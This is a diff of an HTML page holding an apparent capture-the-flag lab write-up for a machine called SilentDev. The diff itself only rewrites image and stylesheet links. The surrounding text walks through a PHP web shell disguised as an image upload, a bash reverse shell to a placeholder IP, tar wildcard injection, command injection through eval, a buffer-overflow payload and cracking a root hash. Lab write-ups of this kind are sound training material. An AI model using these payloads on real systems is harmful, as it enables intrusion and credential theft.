@@ -10,7 +10,7 @@
 <meta name="description" content="Difficulty: Medium 🟠">
 <meta name="author" content="">
 <link rel="canonical" href="https://conper.github.io/writeups/medium/silentdev/">
-<link crossorigin="anonymous" href="../../../assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="https://conper.github.io/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://conper.github.io/assets/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://conper.github.io/assets/favicon.ico">
 <link rel="icon" type="image/png" sizes="32x32" href="https://conper.github.io/assets/favicon.ico">
@@ -241,81 +241,81 @@ img:hover {
 </style>
 <p><a href="https://mega.nz/file/8hQhFCAY#jJoZto-I8qkrtyPAssrI6f68kKWXEPd9OKy_4_I4VXY">Machine Link</a></p>
 <p>The first thing we will do is perform a quick <strong>Nmap</strong> scan to see which <strong>ports</strong> are <strong>open</strong>.</p>
-<p><img alt="1" loading="lazy" src="../../../images/writeups/silentdev/1.png"></p>
+<p><img alt="1" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/1.png"></p>
 <p>Once we know the <strong>open ports</strong>, we will perform a more <strong>detailed scan</strong> on them to identify the <strong>services</strong> running and their <strong>versions</strong>.</p>
-<p><img alt="2" loading="lazy" src="../../../images/writeups/silentdev/2.png"></p>
+<p><img alt="2" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/2.png"></p>
 <p>The target machine is hosting an <strong>SSH</strong> server and a <strong>website</strong>.
 When we access the website, we see that <strong>we can upload</strong> an image.</p>
-<p><img alt="3" loading="lazy" src="../../../images/writeups/silentdev/3.png"></p>
+<p><img alt="3" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/3.png"></p>
 <p>By enumerating <strong>directories</strong> and <strong>files</strong> with <a href="https://github.com/OJ/gobuster"><strong>Gobuster</strong></a>, we discover the existence of a directory called <em><strong>/uploads</strong></em>, nothing else is visible.</p>
-<p><img alt="4" loading="lazy" src="../../../images/writeups/silentdev/4.png"></p>
+<p><img alt="4" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/4.png"></p>
 <p>This is where the images uploaded by users are stored.</p>
-<p><img alt="5" loading="lazy" src="../../../images/writeups/silentdev/5.png"></p>
+<p><img alt="5" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/5.png"></p>
 <p>We try uploading an image to see if it works.</p>
-<p><img alt="6" loading="lazy" src="../../../images/writeups/silentdev/6.png"></p>
-<p><img alt="7" loading="lazy" src="../../../images/writeups/silentdev/7.png"></p>
+<p><img alt="6" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/6.png"></p>
+<p><img alt="7" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/7.png"></p>
 <p>The only way I see to gain access to the machine is to <strong>upload a file</strong> that allows us to <strong>execute commands</strong> without the machine noticing, making it think it is just an image.
 For example, we could embed <strong>malicious PHP code</strong> into a supposed image.</p>
 <pre tabindex="0"><code>&lt;?php
 		echo &#34;&lt;pre&gt;&#34; . shell_exec($_REQUEST[&#39;cmd&#39;]) . &#34;&lt;/pre&gt;&#34;;
 ?&gt;
 </code></pre><p>We will create a file on our local machine called <em><strong>cmd.php.jpg</strong></em> containing the previous code, and when uploading it, we will intercept the request with <strong>Burp Suite</strong>. In the “Filename” field, we will change it to <em><strong>cmd.php</strong></em> while keeping the <strong>MIME type</strong> as if it were an image.</p>
-<p><img alt="8" loading="lazy" src="../../../images/writeups/silentdev/8.png"></p>
-<p><img alt="9" loading="lazy" src="../../../images/writeups/silentdev/9.png"></p>
+<p><img alt="8" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/8.png"></p>
+<p><img alt="9" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/9.png"></p>
 <p>We upload it without any issues, and now <strong>we can execute any command</strong>.</p>
-<p><img alt="10" loading="lazy" src="../../../images/writeups/silentdev/10.png"></p>
+<p><img alt="10" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/10.png"></p>
 <p>To access the machine, we will use a <strong>Reverse Shell</strong>.</p>
-<p><img alt="11" loading="lazy" src="../../../images/writeups/silentdev/11.png"></p>
-<p><img alt="12" loading="lazy" src="../../../images/writeups/silentdev/12.png"></p>
+<p><img alt="11" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/11.png"></p>
+<p><img alt="12" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/12.png"></p>
 <p>Now that we are inside the machine, let’s see why it was so easy to exploit by uploading a <strong>PHP file</strong> without being detected.</p>
-<p><img alt="13" loading="lazy" src="../../../images/writeups/silentdev/13.png"></p>
+<p><img alt="13" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/13.png"></p>
 <p>As we can see, it only restricted by <strong>MIME type</strong>, without actually verifying that the file was truly an image or a GIF.</p>
-<p><img alt="14" loading="lazy" src="../../../images/writeups/silentdev/14.png"></p>
+<p><img alt="14" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/14.png"></p>
 <p>The <strong>www-data</strong> user is part of the <strong>developers</strong> group, and we see that they own two directories.</p>
-<p><img alt="15" loading="lazy" src="../../../images/writeups/silentdev/15.png"></p>
-<p><img alt="16" loading="lazy" src="../../../images/writeups/silentdev/16.png"></p>
+<p><img alt="15" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/15.png"></p>
+<p><img alt="16" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/16.png"></p>
 <p>In <em><strong>/opt/project</strong></em>, we find an <strong>HTML file</strong> for someone named <strong>Vlad</strong>, but there’s not much else here.</p>
-<p><img alt="17" loading="lazy" src="../../../images/writeups/silentdev/17.png"></p>
+<p><img alt="17" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/17.png"></p>
 <p>In the other directory, it seems to contain a backup of what looks like the previous project.</p>
 <p>Since there’s nothing else particularly interesting, we could use the tool <a href="https://github.com/DominicBreuker/pspy"><strong>pspy</strong></a> to see which <strong>processes</strong> and <strong>tasks</strong> are running on the system in real time.</p>
-<p><img alt="18" loading="lazy" src="../../../images/writeups/silentdev/18.png"></p>
-<p><img alt="19" loading="lazy" src="../../../images/writeups/silentdev/19.png"></p>
+<p><img alt="18" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/18.png"></p>
+<p><img alt="19" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/19.png"></p>
 <p>We can see that <strong>every minute</strong>, the <strong>Developer</strong> user performs a <strong>backup</strong> of everything in <em><strong>/opt/project</strong></em>, placing it into a file called <em><strong>project.tgz</strong></em> inside <em><strong>/var/backups/</strong></em> and compressing it with <strong>gzip</strong> to save space.</p>
 <p>It is vulnerable because we have <strong>write permissions</strong> and it uses <code>*</code> to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: <a href="https://conper.xyz/cybersecurity/vulnsandexp/linux/#wildcard-injection"><strong>Wildcard Injection</strong></a></p>
 <p>We execute the following commands in <em><strong>/opt/project</strong></em> and wait to receive the <strong>shell</strong>:</p>
 <pre tabindex="0"><code>echo &#34;bash -i &gt;&amp; /dev/tcp/YOUR_IP/PORT 0&gt;&amp;1&#34; &gt; revshell.sh
 echo &#34;&#34; &gt; --checkpoint=1
 echo &#34;&#34; &gt; &#34;--checkpoint-action=exec=bash revshell.sh&#34;
-</code></pre><p><img alt="20" loading="lazy" src="../../../images/writeups/silentdev/20.png"></p>
+</code></pre><p><img alt="20" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/20.png"></p>
 <p>We are now the <strong>Developer</strong> user.</p>
-<p><img alt="21" loading="lazy" src="../../../images/writeups/silentdev/21.png"></p>
+<p><img alt="21" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/21.png"></p>
 <p>By running the command <strong>sudo -l</strong>, we see that the script <em><strong>sysinfo.sh</strong></em> can be executed as <strong>alfonso</strong> without providing a password.</p>
-<p><img alt="22" loading="lazy" src="../../../images/writeups/silentdev/22.png"></p>
+<p><img alt="22" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/22.png"></p>
 <p>The script is vulnerable because it uses <code>eval</code> with user input, which allows executing dangerous commands. An attacker can exploit this to <strong>run any command</strong>.</p>
 <p>To test this, in the first input we enter 1, and in the second input we enter the command <code>id</code>, but we precede it with a <code>;</code> to separate commands. It will then execute:</p>
 <pre tabindex="0"><code>df; id
-</code></pre><p><img alt="23" loading="lazy" src="../../../images/writeups/silentdev/23.png"></p>
+</code></pre><p><img alt="23" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/23.png"></p>
 <p><strong>It is vulnerable</strong>, so it’s as simple as running a <strong>Reverse Shell</strong> to become <strong>alfonso</strong>.</p>
-<p><img alt="24" loading="lazy" src="../../../images/writeups/silentdev/24.png"></p>
-<p><img alt="25" loading="lazy" src="../../../images/writeups/silentdev/25.png"></p>
+<p><img alt="24" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/24.png"></p>
+<p><img alt="25" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/25.png"></p>
 <p>Now we can retrieve the <strong>User Flag</strong>.</p>
-<p><img alt="26" loading="lazy" src="../../../images/writeups/silentdev/26.png"></p>
+<p><img alt="26" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/26.png"></p>
 <h2 id="root-escalation">Root Escalation<a hidden class="anchor" aria-hidden="true" href="#root-escalation">#</a></h2>
 <p>The last step is to escalate to <strong>root</strong>. Again, by using <strong>sudo -l</strong>, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to <strong>root</strong>.</p>
-<p><img alt="27" loading="lazy" src="../../../images/writeups/silentdev/27.png"></p>
+<p><img alt="27" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/27.png"></p>
 <p>We copy the file to <strong>Alfonso</strong>’s folder, start a temporary web server with <strong>Python</strong>, and <strong>download</strong> the binary to our <strong>local machine</strong> to test it in a more controlled environment.</p>
-<p><img alt="28" loading="lazy" src="../../../images/writeups/silentdev/28.png"></p>
-<p><img alt="29" loading="lazy" src="../../../images/writeups/silentdev/29.png"></p>
+<p><img alt="28" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/28.png"></p>
+<p><img alt="29" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/29.png"></p>
 <p>We give it execution permissions and run it.</p>
-<p><img alt="30" loading="lazy" src="../../../images/writeups/silentdev/30.png"></p>
+<p><img alt="30" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/30.png"></p>
 <p>We can see that it outputs user data from <em><strong>/etc/passwd</strong></em>.</p>
 <p>Now, we will open it with <a href="https://github.com/NationalSecurityAgency/ghidra"><strong>Ghidra</strong></a> to <strong>analyze</strong> how it is implemented internally.</p>
-<p><img alt="31" loading="lazy" src="../../../images/writeups/silentdev/31.png"></p>
-<p><img alt="32" loading="lazy" src="../../../images/writeups/silentdev/32.png"></p>
+<p><img alt="31" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/31.png"></p>
+<p><img alt="32" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/32.png"></p>
 <p>We can now see that it might be vulnerable to a <strong>Buffer Overflow</strong> because <code>gets(buffer)</code> allows writing more data than the buffer can hold, <strong>overwriting memory</strong> and potentially <strong>executing malicious code</strong>.</p>
-<p><img alt="33" loading="lazy" src="../../../images/writeups/silentdev/33.png"></p>
+<p><img alt="33" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/33.png"></p>
 <p>However, by examining the code further, we find a function that has never been executed, which prints the contents of the <em><strong>/etc/shadow</strong></em> file.</p>
-<p><img alt="34" loading="lazy" src="../../../images/writeups/silentdev/34.png"></p>
+<p><img alt="34" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/34.png"></p>
 <p>The plan is to exploit it using a <strong>Buffer Overflow</strong> to ultimately execute this function called <code>get_shadow</code>.</p>
 <h3 id="buffer-overflow-exploitation">Buffer Overflow Exploitation<a hidden class="anchor" aria-hidden="true" href="#buffer-overflow-exploitation">#</a></h3>
 <p>We will first create the complete <strong>payload</strong> on our local machine using <a href="https://sourceware.org/gdb/"><strong>gdb</strong></a>.
@@ -323,18 +323,18 @@ Here’s a guide on how to exploit a <strong>buffer overflow to execute function
 <p>First, we create a <strong>pattern</strong> to find the <strong>offset</strong> and run the script, providing this pattern as input.</p>
 <blockquote>
 <p>📝<strong>NOTE</strong>: In a <strong>Buffer Overflow</strong>, the <strong>offset</strong> is the <strong>number of bytes</strong> needed to reach the return address, which in x86 corresponds to the <strong>EIP</strong>. Overwriting it allows <strong>controlling where the program jumps</strong> when the function ends.</p></blockquote>
-<p><img alt="35" loading="lazy" src="../../../images/writeups/silentdev/35.png"></p>
+<p><img alt="35" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/35.png"></p>
 <pre tabindex="0"><code>r &lt;&lt;&lt; &#39;PATTERN&#39;
-</code></pre><p><img alt="36" loading="lazy" src="../../../images/writeups/silentdev/36.png"></p>
+</code></pre><p><img alt="36" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/36.png"></p>
 <p>Now we can calculate <strong>how many characters</strong> are needed to reach the <strong>EIP</strong> with this command:</p>
 <pre tabindex="0"><code>pattern offset $eip
-</code></pre><p><img alt="37" loading="lazy" src="../../../images/writeups/silentdev/37.png"></p>
+</code></pre><p><img alt="37" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/37.png"></p>
 <p>We can verify it like this to confirm the <strong>offset</strong> is actually <strong>76</strong>:</p>
 <pre tabindex="0"><code>r &lt;&lt;&lt; $(python3 -c &#39;print(&#34;A&#34;*76 + &#34;B&#34;*4)&#39;)
-</code></pre><p><img alt="38" loading="lazy" src="../../../images/writeups/silentdev/38.png"></p>
+</code></pre><p><img alt="38" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/38.png"></p>
 <p>It is indeed <strong>76</strong>. Next, we need the <strong>memory address</strong> of the <code>get_shadow</code> <strong>function</strong> we found earlier in <strong>Ghidra</strong>.</p>
 <pre tabindex="0"><code>p get_shadow
-</code></pre><p><img alt="39" loading="lazy" src="../../../images/writeups/silentdev/39.png"></p>
+</code></pre><p><img alt="39" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/39.png"></p>
 <p>We must write the address in <strong>little-endian</strong> (for example, <code>0x080484b6</code> as <code>\xb6\x84\x04\x08</code>), since systems store multi-byte values in that order for the function to execute correctly.</p>
 <p>In our case, it will be:</p>
 <pre tabindex="0"><code>\x05\x99\x04\x08
@@ -343,12 +343,12 @@ Here’s a guide on how to exploit a <strong>buffer overflow to execute function
 <pre tabindex="0"><code>./silentgets &lt;&lt;&lt; $(python3 -c &#39;import sys; sys.stdout.buffer.write(b&#34;A&#34;*76 + b&#34;\x05\x99\x04\x08&#34;)&#39;)
 </code></pre><p>We will run it directly on the <strong>target machine</strong>, using <strong>sudo</strong> and the full path to the binary.</p>
 <pre tabindex="0"><code>sudo /usr/bin/silentgets &lt;&lt;&lt; $(python3 -c &#39;import sys; sys.stdout.buffer.write(b&#34;A&#34;*76 + b&#34;\x05\x99\x04\x08&#34;)&#39;)
-</code></pre><p><img alt="40" loading="lazy" src="../../../images/writeups/silentdev/40.png"></p>
+</code></pre><p><img alt="40" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/40.png"></p>
 <p>We obtain the <strong>root</strong> user’s password <strong>hash</strong>, which we will crack using <a href="https://hashcat.net/hashcat/"><strong>hashcat</strong></a>.</p>
 <pre tabindex="0"><code>hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
-</code></pre><p><img alt="41" loading="lazy" src="../../../images/writeups/silentdev/41.png"></p>
+</code></pre><p><img alt="41" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/41.png"></p>
 <p><strong>Password obtained</strong>! We log in as <strong>root</strong> and finally get the <strong>Root Flag</strong>.</p>
-<p><img alt="42" loading="lazy" src="../../../images/writeups/silentdev/42.png"></p>
+<p><img alt="42" loading="lazy" src="https://conper.github.io/images/writeups/silentdev/42.png"></p>
 <p>Machine completed!!</p>
 
 
